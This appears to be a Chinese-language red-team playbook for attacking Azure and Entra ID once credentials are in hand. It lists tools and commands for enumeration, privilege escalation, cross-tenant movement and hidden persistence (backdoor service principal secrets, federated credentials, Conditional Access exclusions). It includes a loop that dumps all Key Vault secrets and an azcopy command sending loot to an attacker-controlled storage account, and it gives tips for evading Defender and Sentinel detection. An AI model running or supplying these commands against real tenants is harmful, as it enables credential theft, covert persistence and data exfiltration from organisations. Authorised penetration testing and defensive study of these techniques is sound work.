# Azure / Entra ID Attack Flow / Azure 红队流程

> 上游入口：`SKILL.md` → 本文档。
> 适用：已拿到 Azure / Entra (formerly Azure AD) 凭据 —— 用户名密码 / Refresh Token / Service Principal cred / Managed Identity token / Azure CLI cached token。
> 关键差异：**身份层（Entra）和资源层（Azure RM）是两套权限体系**，提权路径分两条线。

## 必备工具

```text
□ az CLI            — Azure RM 官方 CLI
□ Az PowerShell     — Azure RM PowerShell
□ AzureAD / MSGraph PS modules — Entra 操作
□ ROADtools         — Entra 全图枚举（ROADrecon + ROADoidc）
□ AzureHound        — BloodHound for Azure（需 BloodHound CE/Enterprise）
□ MicroBurst        — Azure resource enum + privesc PS module
□ Prowler / ScoutSuite — 多云审计
□ TokenSmith / TeamFiltration — Token / OAuth 攻击（凭据获取阶段）
```

缺工具：`bootstrap-reverse.ps1 -Capability @('az-cli','prowler','scoutsuite') -StartServices`
**ROADtools / AzureHound 需手动安装**（bootstrap canAutoInstall=false）：
- ROADtools：先装 .NET 6 SDK → `pip install roadrecon roadtx`
- AzureHound：从 GitHub release 下载 Windows zip → 加 PATH

---

## 0. 凭据准入 + 类型识别

```powershell
# az CLI 凭据
az login --use-device-code   # 或 az login -u user -p pass --tenant <tid>
az account show              # 当前 subscription / tenant
az account list -o table     # 所有可见 subscription

# Az PowerShell
Connect-AzAccount
Get-AzContext

# Service Principal
az login --service-principal -u <appId> -p <secret> --tenant <tid>

# Refresh Token / Access Token（最常见的"已渗透"凭据）
# 用 ROADtools 直接导入：
roadrecon auth --refresh-token <token> --tenant <tid>
```

| 凭据类型 | 能做什么 | 不能做什么 |
|---------|---------|-----------|
| 用户名+密码 (无 MFA) | 一切该用户能做的 | MFA 拦截 |
| Refresh Token | 静默换 Access Token，绕过 MFA（只要 token 没过期）| 用户改密码后失效 |
| Service Principal | 自动化任务身份；可能高权 | 通常无 Graph API 权限（除非显式授）|
| Managed Identity | 资源内部自动认证 | 离开资源即失效 |
| User-Assigned MI | 跨资源复用 | 同上 |

---

## 1. Discovery / Entra + Azure RM 双面盘点 (TA0007)

### 1.1 Entra（身份层）

```bash
# ROADtools 全图导出（**Entra 红队的事实标准**）
roadrecon auth --device-code --tenant <tid>      # 拿 token
roadrecon gather                                  # 拉全图
roadrecon gui                                     # localhost web UI 查看

# AzureHound（图分析）
azurehound list -u user@target.onmicrosoft.com -p <pwd> --tenant <tid> -o azurehound.json
# → 导入 BloodHound CE → Cypher 查询路径
```

### 1.2 Azure RM（资源层）

```powershell
# 资源订阅全枚举
az resource list --subscription <sid> -o json > resources.json

# MicroBurst — 从 Azure CLI/Az PowerShell 已有 token 拉资源 + 凭据
Import-Module MicroBurst
Get-AzPasswords -Verbose          # 全订阅扫 KeyVault / App Service / Automation Account 凭据
Invoke-EnumerateAzureSubDomains -Base target -Verbose

# ScoutSuite
scout azure --cli                  # 用当前 az 登录的凭据
```

### 1.3 关键服务面

| 服务 | 红队价值 | 命令 |
|------|---------|------|
| Key Vault | 数据库/SP 凭据集中地 | `az keyvault list; az keyvault secret list --vault-name X` |
| Storage Account | Blob 数据；可能含备份/快照 | `az storage account list; az storage blob list` |
| Automation Account | Runbook 跑代码 → 横向到任意资源 | `az automation account list` |
| App Service | Web App + KUDU console = RCE | `az webapp list; az webapp deployment list` |
| Function App | 无服务器代码 + Managed Identity | `az functionapp list` |
| Logic App | 工作流 → 凭据穿越 | `az logic workflow list` |
| Azure DevOps / GitHub Apps | 仓库 + secrets + service connection | `az devops` (extension) |

---

## 2. Privilege Escalation / 提权 (TA0004)

### 2.1 Entra (身份层) 提权

| 路径 | 前置 | 动作 |
|------|------|------|
| Application Administrator → SP impersonation | `Application Administrator` directory role | 给目标 SP 加 client secret，用该 SP 登录（**T1098.001 + T1078.004**） |
| Cloud Application Administrator → 同上 | 同上但仅限 cloud apps | 同上 |
| Privileged Authentication Administrator | 该角色 | 重置 Global Admin 密码 |
| MFA Sweep + password spray | 任意身份 | `MFASweep.ps1` 找未启用 MFA 的高权用户，喷洒 |
| Owner of group → group 是某 role 成员 | group ownership | 把自己加进 group |
| Application API Permissions 过权（**最常见**）| 应用注册时给了过多 Graph 权限 | 用应用 token 调用 Graph 拿任意用户/邮件 |
| Conditional Access bypass | 设备/位置策略漏洞 | 伪造 device compliance / 改变源 IP |

```bash
# ROADtools 找 privesc 边
roadrecon plugin findpaths        # 输出当前身份到 Global Admin 的路径
```

### 2.2 Azure RM (资源层) 提权

| 路径 | 命令 |
|------|------|
| Owner / Contributor on subscription = 全订阅 RM 控制 | `az role assignment list --assignee <id>` |
| User Access Administrator → 自己加 Owner | `az role assignment create --role Owner --assignee me` |
| Storage Account Key Operator → 拿 Storage Key → SAS → 任意写 | MicroBurst `Get-AzStorageKeys` |
| KeyVault Crypto Officer → 用 KMS 密钥解密 | `az keyvault key decrypt` |
| Automation Account RunAs → 用 RunAs 高权 SP | MicroBurst `Get-AzPasswords` |
| Managed Identity assignable to lower-privileged resource → 复用 | `az identity list; az identity federation` |

### 2.3 双面交叉提权

```text
最常见的攻击链：
1. Entra 普通用户（钓鱼 / 密码喷洒拿到）
2. → 看其拥有的 Azure RM role（Contributor on RG）
3. → 在 RG 内创建 VM with high-priv MI
4. → MI 是 Owner on Subscription → 整个订阅控制
5. → 借助 Cross-Tenant Sync / B2B Direct Connect 跨租户

工具链：
  ROADtools → Entra 视角
  MicroBurst Get-AzPasswords → 资源层快速捡漏
  AzureHound → BloodHound 路径图
```

---

## 3. Lateral Movement / 跨订阅 + 跨租户 (TA0008)

### 3.1 同租户跨订阅

```bash
# 列举所有可见订阅
az account list --all -o table
# 切换
az account set --subscription <sid>
# 用 MI 跨订阅：MI 本身就是租户级身份，分配给不同 sub 的资源
```

### 3.2 跨租户

```text
□ B2B Direct Connect — 跨租户共享应用，token 自动跨域有效
□ Cross-Tenant Sync — 同步用户对象 → 在伙伴租户内拥有同名 hybrid identity
□ Multi-tenant App Registration — 一个 app 注册在多个租户里，consent 流程后能拿对方 token
□ Compromised partner SP — 合作伙伴的 SP cred 在己方租户里被信任为 cross-tenant principal
```

---

## 4. Persistence / 长效后门 (TA0003)

| 技术 (Txxxx) | 实现 | OPSEC |
|------|------|-------|
| 新建 SP + secret (T1098.001) | `az ad sp create-for-rbac --name backdoor` | 容易被 Defender for Cloud 检测 |
| 给现有 SP 加 secret | `az ad app credential reset --id <appId> --append` | 隐蔽，特别是大量 SP 的目标 |
| Federated identity credential | `az ad app federated-credential create` | 联邦凭据无 secret，最隐蔽 |
| Conditional Access 排除策略 | 加一个 "Exclude this group" 规则 | 高权才能改，但改了基本不会被注意 |
| 添加额外的应用 API permission | `az ad app permission add` | 慢工出细活 |
| Hidden user via Privileged Roles | 不直接给 GA，给隐蔽角色（Conditional Access Admin etc.） | 审计需专门看 |

---

## 5. Collection + Exfiltration (TA0009 / TA0010)

```bash
# Collection
# Key Vault dump（前提是有 Get/List secret 权限）
az keyvault list -o tsv --query "[].name" | while read v; do
  az keyvault secret list --vault-name $v -o tsv --query "[].name" | while read s; do
    az keyvault secret show --vault-name $v --name $s --query value -o tsv > "secrets/$v-$s.txt"
  done
done

# Storage Blob sync
az storage blob download-batch --account-name <acct> --source <container> --destination ./loot

# Exchange Online / OneDrive (T1114 / T1213.002)
# Refresh Token + MailSniper / TeamFiltration
TeamFiltration --enum --user-list users.txt --tenant target.onmicrosoft.com
TeamFiltration --exfil --refresh-token <rt> --target user@target.onmicrosoft.com

# Exfiltration — 同 vendor 桶（攻击者 Storage Account）
azcopy copy "/tmp/loot/*" "https://attacker.blob.core.windows.net/exfil?<SAS>" --recursive
```

---

## 6. OPSEC / 检测面

```text
□ Microsoft Defender for Cloud / Defender for Identity / Sentinel：
  - 异地登录、不可能的旅行
  - 罕见用户访问敏感资源
  - SP credential 创建（"Add service principal credentials" 审计事件）
  - Federated identity 添加（仅近期才被纳入告警）
□ Microsoft Graph audit logs：所有 Entra 操作均留痕
□ Conditional Access：触发但被 bypass 时不一定告警；触发但 deny 高优告警
□ 不要批量 ROADrecon —— 单租户大批量 Graph 调用 = 异常用户行为模型告警
  对策：分天跑 / 仅拉特定对象类型
□ ROADtools 的 device-code 流程会触发"DeviceCodeFlow"审计事件 —— 可见但不显眼
□ 跨租户 B2B 同步触发明显告警 —— 提前评估必要性
```

## 7. 工具命令速查

| 任务 | 命令 |
|------|------|
| 当前身份 | `az account show; Get-AzContext` |
| 错配扫 | `prowler azure --az-cli-auth` |
| 资产快照 | `scout azure --cli` |
| Entra 全图 | `roadrecon gather; roadrecon gui` |
| Entra 路径 | `azurehound list -u ... -o az.json` → BloodHound |
| 资源凭据 | `Get-AzPasswords -Verbose` (MicroBurst) |
| 跨订阅 | `az account list --all` |

## 参考

- [ROADtools docs](https://github.com/dirkjanm/ROADtools)
- [MicroBurst](https://github.com/NetSPI/MicroBurst)
- [HackTricks — Azure Pentesting](https://book.hacktricks.wiki/en/pentesting-cloud/azure-pentesting/)
- [TrustedSec — Azure Privilege Escalation](https://trustedsec.com/blog/) (defender for cloud bypass writeups)
- [TeamFiltration](https://github.com/Flangvik/TeamFiltration) — M365 Refresh Token / OAuth 攻击
- 事前查 `field-journal/_index.md` 是否有 Azure 历史项目
